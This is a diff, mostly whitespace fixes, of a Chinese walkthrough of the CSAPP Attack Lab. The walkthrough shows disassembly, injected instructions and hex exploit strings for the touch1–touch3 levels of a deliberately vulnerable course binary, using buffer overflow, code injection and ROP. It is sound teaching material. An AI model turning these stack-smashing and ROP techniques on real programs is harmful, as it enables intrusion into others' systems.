@@ -30,12 +30,9 @@ cat ans.txt | ./hex2raw | ./ctarget -q
 
 来得到运行结果。若没有参数 `-q` 则会出现 `Error`，因为你没有 `CSAPP` 的账号，不能发送到服务器上去……（你没资格啊，你没资格啊——）
 
-
-
 # 实验过程
 
 ## ctarget
-
 
 ```c
 void test(){
@@ -44,7 +41,7 @@ void test(){
 	printf("No exploit. Getbuf returned 0x%x\n", val);
 }
 
-unsigned getbuf() { 
+unsigned getbuf() {
     char buf[BUFFER_SIZE];
 	Gets(buf);
 	return 1;
@@ -80,7 +77,7 @@ void touch1(){
   4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
   4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
   4017b9:	48 83 c4 28          	add    $0x28,%rsp
-  4017bd:	c3                   	retq   
+  4017bd:	c3                   	retq
   4017be:	90                   	nop
   4017bf:	90                   	nop
 ```
@@ -91,7 +88,7 @@ void touch1(){
 00000000004017c0 <touch1>:
   4017c0:	48 83 ec 08          	sub    $0x8,%rsp
   4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
-  4017cb:	00 00 00 
+  4017cb:	00 00 00
   4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
   4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
   4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
@@ -111,7 +108,7 @@ void touch1(){
 c0 17 40 00 00 00 00 00
 ```
 
-注意地址需要用小端法书写（在第二章中有提到x86-64的机器都是用小端法）
+注意地址需要用小端法书写（在第二章中有提到 x86-64 的机器都是用小端法）
 
 ### touch2
 
@@ -156,6 +153,7 @@ retq
 subl $4, %rsp
 movq $0x4017ec, (%rsp)
 ```
+
 而 `ret` 等价于：
 
 ```asm
@@ -171,7 +169,7 @@ addl $4, %rsp
 
 ![image.png](https://virgil-civil-1311056353.cos.ap-shanghai.myqcloud.com/img/20231002173727.png)
 
-其值为 `0x5561dc78` 
+其值为 `0x5561dc78`
 
 于是，我们可以写出指令序列为：
 
@@ -187,7 +185,7 @@ addl $4, %rsp
 
 与 `touch2` 的任务类似，但我们需要传入的是 `cookie` 的字符串形式，而非一个立即数，因此，我们需要查询 `0x59b997fa` 的 `ascii` 形式怎么表示（不需要 `0x` ）
 
-其字符串表示为 ： `35 39 62 39 39 37 66 61 00` （注意，我们需要在末尾加上 `'\0'` 
+其字符串表示为 ： `35 39 62 39 39 37 66 61 00` （注意，我们需要在末尾加上 `'\0'`
 
 我们可以轻松写出如下汇编：
 
@@ -265,6 +263,7 @@ fa 97 b9 59 00 00 00 00
 a2 19 40 00 00 00 00 00
 ec 17 40 00 00 00 00 00
 ```
+
 ### touch3
 
 > 文档已经开始劝退了 :joy:
@@ -272,7 +271,7 @@ ec 17 40 00 00 00 00 00
 
 难点主要在于如何传递这个字符串指针，在前面我们知道，字符串的指针是通过 `%rsp` 算出来的，但由于这里我们没办法知道 `%rsp` 的绝对值，所以我们必须读取 `%rsp` 的值，并对其做偏移
 
-1. `movq %rsp, %rax`，机器码为 `48 89 e0 c3` 
+1. `movq %rsp, %rax`，机器码为 `48 89 e0 c3`
 2. `add $offset, %rax`
 3. `movq %rax, %rdi`，机器码为 `48 89 c7 c3`
 
@@ -304,4 +303,3 @@ fa 18 40 00 00 00 00 00
 00 00 00 00 00 00 00
 35 39 62 39 39 37 66 61 00
 ```
-
